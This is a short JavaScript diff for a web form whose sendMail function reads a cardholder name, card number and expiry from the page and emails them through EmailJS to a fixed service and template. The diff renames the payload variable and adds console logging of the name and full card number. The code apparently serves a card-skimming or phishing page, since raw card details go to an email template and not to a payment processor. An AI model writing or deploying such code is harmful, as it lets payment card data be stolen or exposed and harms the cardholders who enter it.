@@ -4,7 +4,7 @@ console.log("line");
 
 function sendMail () {
     
-    let data = {
+    var parms = {
         holderName: document.querySelector(".k-holderName").value,
         cardNumber: document.querySelector(".k-cardNumber").value,
         exMonth: document.querySelector(".k-exMonth").value,
@@ -14,8 +14,9 @@ function sendMail () {
 
     const serviceID = "service_hnqtgz9";
     const templateID = "template_7l6ykzs";
+    
 
-    emailjs.send(serviceID, templateID, data)
+    emailjs.send(serviceID, templateID, parms)
     .then(
         (res) => {
             
@@ -26,7 +27,9 @@ function sendMail () {
     )
     .catch((err) => console.log(err));
 
-    console.log(data);
+    console.log(document.querySelector(".k-holderName").value);
+    console.log(document.querySelector(".k-cardNumber").value);
+    
 
 }
 
